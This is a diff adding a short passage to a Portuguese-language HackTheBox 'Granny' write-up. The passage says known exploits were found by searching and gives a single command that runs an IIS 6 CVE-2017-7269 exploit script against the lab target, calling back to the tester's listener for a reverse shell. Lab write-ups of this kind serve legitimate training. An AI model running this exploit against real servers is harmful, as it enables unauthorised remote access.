@@ -97,4 +97,18 @@ Bom, eu particulamente nao achei muito eficiente pra essa maquina.. Mas isso eh 
 
 Continuando...
 
+## Find Exploits
+
+Pesquisando por exploit conhecidos no google, encontra rapidamente algumas exploracoes...
+
+![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-granny/3.jpg)
+
+
+## Reverse Shell
+
+Rapidamente conseguimos obter nossa reverse shell
+
+`python iis6CVE-2017-7269.py 10.10.10.15 80 10.10.14.36 53`
+
+![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-granny/2.jpg)
 
